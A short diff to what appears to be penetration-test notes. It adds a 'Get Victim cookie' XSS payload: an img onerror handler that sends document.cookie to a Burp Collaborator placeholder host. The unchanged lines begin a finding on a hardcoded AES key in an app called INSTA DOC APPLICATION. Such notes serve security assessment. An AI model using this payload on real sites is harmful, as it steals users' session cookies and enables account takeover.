@@ -1,3 +1,6 @@
+Get Victim cookie 
+<img src=x onerror="document.location='http://burpcollaboratorLink?c='+document.cookie;" />
+
 Exposure of AES Encryption Key in Source Code
 Description 
 During the assessment of the INSTA DOC APPLICATION 's login functionality, it was observed that the sensitive encryption keys are hardcoded stored in plaintext within the application's codebase which is compromising the security of encrypted data. 
